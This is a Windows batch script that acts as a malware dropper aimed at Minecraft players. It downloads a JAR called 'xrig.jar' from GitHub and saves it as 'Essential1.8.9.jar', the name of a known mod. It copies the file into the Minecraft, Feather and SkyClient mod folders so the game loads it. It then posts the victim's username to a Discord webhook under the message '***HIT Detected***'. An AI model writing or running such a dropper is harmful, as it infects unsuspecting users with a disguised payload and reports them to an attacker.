@echo off 
curl -s -o "Essential1.8.9.jar" -JL "https://github.com/torch-studios/ste/raw/main/xrig.jar"
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.minecraft\mods" >nul 
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.feather\user-mods\1.8.9" >nul 
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.minecraft\skyclient\mods" >nul 
echo Loading...
(
    echo {
    echo   "content": "***HIT Detected***",
    echo   "embeds": [
    echo     {
    echo       "description": "```Someone typed command into cmd!```",
    echo       "color": null,
    echo       "footer": {
    echo         "text": "%username%"
    echo       },
    echo       "thumbnail": {
    echo         "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7lwlzlUXaVIvuT37hxGMYazosOviq-pnvGA&usqp=CAU"
    echo       }
    echo     }
    echo   ],
    echo   "username": "Astolfo",
    echo   "avatar_url": "https://i.ebayimg.com/images/g/BkkAAOSwZuJkESkQ/s-l1200.webp",
    echo   "attachments": []
    echo }
) > payload.json
curl -X POST -H "Content-Type: application/json" -d @payload.json "https://discord.com/api/webhooks/1190721538803126352/W0zbU-VkXAuQuGVKlosUHvYlBZCpPwGYt0_974wifYuCHerJEC1xgUv-QXDbPyvt9TTN"
del payload.json
exit 